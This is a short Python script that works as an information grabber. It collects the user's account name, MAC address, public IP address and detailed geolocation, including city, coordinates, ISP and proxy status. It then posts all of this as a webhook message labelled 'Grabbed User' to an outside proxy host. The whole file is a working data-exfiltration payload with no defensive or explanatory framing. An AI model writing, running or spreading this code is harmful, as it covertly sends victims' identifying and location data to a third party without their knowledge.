import requests
import os
import re
import uuid

pcname = os.path.expanduser("~")[9:]
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))

ip = requests.get('https://api.ipify.org/').text
r = requests.get(f"http://ip-api.com/json/{ip}?fields=message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query").json()

def format_asp(json_data):
    formatted_output = ""
    for key, value in json_data.items():
        formatted_output += f"{key}: {value}\n"
    return formatted_output

asp_formatted = format_asp(r)

data = {
    "username" : f"Grabbed User: {pcname}",
    "avatar_url": "https://wallpapersden.com/joker-hahaha-wallpaper/5120x2880/",
    "embeds": [{
        "title": "PC Information",
        "description": f"**PC Username:** `{pcname}`\n**MAC Address:** `{mac}`\n**IP Data:**\n```{asp_formatted}```",
        "color": 16711680  # Red color
    }]
}

webhook = "https://dude.ong/api/proxy/"
requests.post(webhook, json=data)